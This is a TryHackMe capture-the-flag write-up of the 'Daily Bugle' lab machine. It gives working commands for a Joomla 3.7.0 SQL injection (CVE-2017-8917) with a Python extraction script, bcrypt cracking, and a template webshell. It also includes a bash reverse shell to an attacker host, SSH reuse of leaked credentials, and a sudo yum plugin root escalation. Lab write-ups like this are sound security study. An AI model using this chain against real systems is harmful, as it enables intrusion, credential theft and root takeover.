# Daily Bugle -- TryHackMe Writeup

**Status:** WIP / pending full escalation documentation.
**Target:** `TARGET_IP` (10.130.177.13 at time of solve)
**OS:** Linux (CentOS)
**Difficulty:** Hard
**Tech stack:** Apache 2.4.6, PHP 5.6.40, Joomla 3.7.0, MariaDB
**Exploit chain:** Joomla 3.7.0 `com_fields` SQLi (CVE-2017-8917) -> custom error-based dump -> `jonah:spiderman123` -> admin panel -> template webshell -> `www-data` shell -> `configuration.php` creds -> SSH as `jjameson` -> `sudo yum` plugin injection -> root

---

## Attack Chain Overview

```
nmap -> 22, 80 (Apache + Joomla), 3306 (MariaDB)
    ->
curl /administrator/manifests/files/joomla.xml -> Joomla 3.7.0
    ->
CVE-2017-8917 com_fields SQLi -> error-based extraction
    ->
Custom Python script -> jonah : $2y$10$... (bcrypt)
    ->
hashcat -m 3200 -> spiderman123
    ->
Joomla admin -> template editor -> shell.php -> www-data
    ->
configuration.php -> nv5uz9r3ZEDzVjNu -> SSH jjameson
    ->
sudo -l -> (ALL) NOPASSWD: /usr/bin/yum
    ->
yum plugin injection -> root shell -> root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Joomla Fingerprint](#2-joomla-fingerprint)
3. [Initial Access -- Joomla SQLi + Hash Crack](#3-initial-access--joomla-sqli--hash-crack)
4. [Webshell via Template Editor](#4-webshell-via-template-editor)
5. [User Pivot -- Configuration.php Credentials](#5-user-pivot--configurationphp-credentials)
6. [Privilege Escalation -- sudo yum Plugin Injection](#6-privilege-escalation--sudo-yum-plugin-injection)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full port scan and service version detection.
# Why here: identify the Joomla web application and MariaDB service.
nmap -sS -p- --min-rate 5000 --open -Pn -n $TARGET -oN silent
nmap -sVC -p22,80,3306 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.4 |
| 80/tcp | Apache 2.4.6 (CentOS) + PHP 5.6.40 -- Joomla |
| 3306/tcp | MariaDB (unauthorized) |

See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. Joomla Fingerprint

```bash
# What it does: brute-force directories on the Joomla web server.
# Why here: discover the /administrator login panel and other endpoints.
feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

# What it does: retrieve the Joomla manifest to identify the exact version.
# Why here: confirm version 3.7.0 which is vulnerable to CVE-2017-8917.
curl -s http://$TARGET/administrator/manifests/files/joomla.xml | grep version
# <version>3.7.0</version>
```

Tools: [feroxbuster](../../../tools/fuzz/feroxbuster.md), [curl](../../../tools/web/curl.md).

---

## 3. Initial Access -- Joomla SQLi + Hash Crack

Full technique: [joomla-com-fields-sqli.md](../../../exploits/web-rce/joomla-com-fields-sqli.md).

### 3a. Confirm the vulnerability

```bash
# What it does: test the com_fields SQL injection with an XML error payload.
# Why here: confirm that CVE-2017-8917 is exploitable and leaks data via error messages.
curl "http://$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,version()),1)"
# 500 XPATH syntax error: '~5.5.64-MariaDB'
```

### 3b. Custom extraction script

```python
# What it does: automate error-based SQL injection to extract Joomla users.
# Why here: dump the admin username, bcrypt hash and email from the Joomla database.
import requests
import re

TARGET = "10.130.177.13"
BASE_URL = f"http://{TARGET}/index.php"
BASE_PARAMS = {"option": "com_fields", "view": "fields", "layout": "modal"}

def to_hex(s):
    return "0x" + s.encode().hex()

def query(sql):
    payload = (
        f"(SELECT 1 FROM(SELECT COUNT(*),CONCAT("
        f"0x7171767071,"
        f"({sql}),"
        f"0x716a707671,"
        f"FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
    )
    params = {**BASE_PARAMS, "list[fullordering]": payload}
    r = requests.get(BASE_URL, params=params)
    match = re.search(r"qqvpq(.*?)qjpvq", r.text)
    if match:
        return match.group(1)
    return None

# ... (full script iterates databases, tables, and user rows)
```

Result:
```
user : jonah
hash : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
email: jonah@tryhackme.com
```

### 3c. Crack the hash

```bash
# What it does: crack the bcrypt hash using hashcat with the rockyou wordlist.
# Why here: recover the Joomla admin password for CMS access.
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --status -O
hashcat hash.txt --show
# spiderman123
```

Tools: [hashcat](../../../tools/creds/hashcat.md).

---

## 4. Webshell via Template Editor

Full technique: [joomla-template-editor-webshell.md](../../../exploits/web-rce/joomla-template-editor-webshell.md).

With Joomla admin access, a webshell was injected into the `beez3` template via the template editor.

```bash
# What it does: test command execution through the uploaded webshell.
# Why here: confirm RCE as www-data before upgrading to a full reverse shell.
curl -g "http://$TARGET/templates/beez3/cmd.php?cmd=id"

# What it does: start a TCP listener on the attacker machine.
# Why here: receive the reverse shell from the Joomla webshell.
nc -lvnp 8080

# What it does: trigger a bash reverse shell via the webshell.
# Why here: establish an interactive foothold as the Apache user.
curl -g "http://$TARGET/templates/beez3/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/8080+0>%261'"
```

---

## 5. User Pivot -- Configuration.php Credentials

```bash
# What it does: read the Joomla configuration file.
# Why here: extract database credentials that may be reused for SSH.
cat /var/www/html/configuration.php
# $password = 'nv5uz9r3ZEDzVjNu';
# $db = 'joomla';
```

```bash
# What it does: log in via SSH as jjameson with the discovered password.
# Why here: pivot from www-data to a real user account.
ssh jjameson@$TARGET
# password: nv5uz9r3ZEDzVjNu

# What it does: check allowed sudo commands.
# Why here: identify the yum binary as a privilege escalation vector.
sudo -l
# (ALL) NOPASSWD: /usr/bin/yum
```

---

## 6. Privilege Escalation -- sudo yum Plugin Injection

Full technique: [yum-sudo-plugin-injection.md](../../../privesc/linux/yum-sudo-plugin-injection.md).

`yum` is a Python script that loads plugins from configured directories. A malicious plugin that runs `/bin/sh` inherits root privileges.

```bash
# What it does: create a temporary directory with a fake yum config and malicious plugin.
# Why here: build the three files needed to inject a root shell into yum's plugin system.
TF=$(mktemp -d)

cat >$TF/x<<EOF
[main]
pluginpath=$TF
gpgcheck=0
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

# What it does: execute yum with the custom config and malicious plugin.
# Why here: trigger the plugin injection to spawn a root shell.
sudo yum -c $TF/x --enableplugin=y
```

```bash
# What it does: confirm root access and read the flag.
# Why here: complete the machine and capture final proof.
whoami
# root
cat /root/root.txt
```

---

## 7. Key Takeaways

- Joomla version fingerprinting via `/administrator/manifests/files/joomla.xml` is reliable and fast -- always check before running heavy scanners.
- CVE-2017-8917 (`com_fields` SQLi) is error-based and works without authentication. The `updatexml()` + `FLOOR(RAND(0)*2)` double-query pattern is the standard extraction primitive.
- Joomla template editors (like WordPress theme editors) give direct RCE when you have admin access. Always check the template manager after gaining CMS credentials.
- `configuration.php` in Joomla (like `wp-config.php` in WordPress) leaks database credentials that are frequently reused for SSH.
- `sudo yum` is a GTFOBins classic -- the plugin system allows arbitrary Python execution under the calling user's privileges.

---

## Related Notes
- [joomla-com-fields-sqli.md](../../../exploits/web-rce/joomla-com-fields-sqli.md) -- initial access
- [joomla-template-editor-webshell.md](../../../exploits/web-rce/joomla-template-editor-webshell.md) -- RCE chain
- [yum-sudo-plugin-injection.md](../../../privesc/linux/yum-sudo-plugin-injection.md) -- root privesc
- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) -- playbook backbone
- [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [curl](../../../tools/web/curl.md), [hashcat](../../../tools/creds/hashcat.md)
